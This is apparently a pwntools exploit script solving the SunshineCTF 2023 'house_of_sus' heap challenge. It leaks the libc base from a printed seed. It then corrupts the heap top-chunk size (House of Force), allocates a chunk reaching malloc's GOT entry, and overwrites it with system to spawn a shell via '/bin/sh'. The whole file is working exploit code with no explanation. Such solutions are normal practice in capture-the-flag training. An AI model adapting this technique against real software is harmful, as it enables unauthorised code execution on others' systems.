#!/usr/bin/env python3
from pwn import *
from ctypes import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

elf = context.binary = ELF('./house_of_sus')
libc = ELF('./libc.so.6')

if args.REMOTE:
    io = remote('chal.2023.sunshinectf.games', 23001)
    # io = process(['stdbuf', '-i0', '-o0', '-e0', 'nc', 'chal.2023.sunshinectf.games', '23001'])
else:
    io = elf.process()
    # io = process(['stdbuf', '-i0', '-o0', '-e0', './house_of_sus'])
#     gdb.attach(io, '''
# heap-analysis-helper
# break *0x401857
# continue
# ''')

io.recvuntil(b'joining game: 0x')
malloced_chunk = int(io.recvline(), 16)
malloced_chunk_size = 0x20
top_chunk = malloced_chunk + malloced_chunk_size

def auto_vote():
    # io.sendlineafter(b'choice: ', b'6')
    io.sendline(b'6')

def emerge(size, response):
    # io.sendlineafter(b'choice: ', b'3')
    # io.sendlineafter(b'response be? ', str(size).encode('utf-8'))
    # io.sendlineafter(b'response: ', response)
    io.sendlineafter(b'emergency meeting', b'3')
    io.sendlineafter(b'>:(', str(size).encode('utf-8'))
    io.sendline(response)
    auto_vote()

def report():
    # io.sendlineafter(b'choice: ', b'2')
    io.sendline(b'2')
    io.recvuntil(b'the seed: ')
    result = int(io.recvline())
    auto_vote()
    return result

def do_task():
    # io.sendlineafter(b'choice: ', b'1')
    io.sendline(b'1')

do_task()
libc.address = report() - libc.sym['rand']

print('libc', hex(libc.address))

# io.interactive()

# corrupting top chunk to be very large and mmap bit set
emerge(8, b'/bin/sh' + b'\x00' * 17 + b'\xff' * 8)

got_malloc = elf.got['malloc']

ntr_size = got_malloc - 4 * 8 - top_chunk
print(ntr_size)
ntr_size = c_ulong(got_malloc - 4 * 8 - top_chunk).value
print(ntr_size)


# exit()

print(hex(ntr_size))

# pause()
emerge(ntr_size, b'')

emerge(8, p64(libc.sym['system']) + p64(libc.sym['__isoc99_scanf'])) # we write scanf so we don't put a newline in it

io.sendlineafter(b'choice: ', b'3')
io.sendlineafter(b'response be? ', str(malloced_chunk + 0x10).encode('utf-8'))
# pause()


io.interactive()
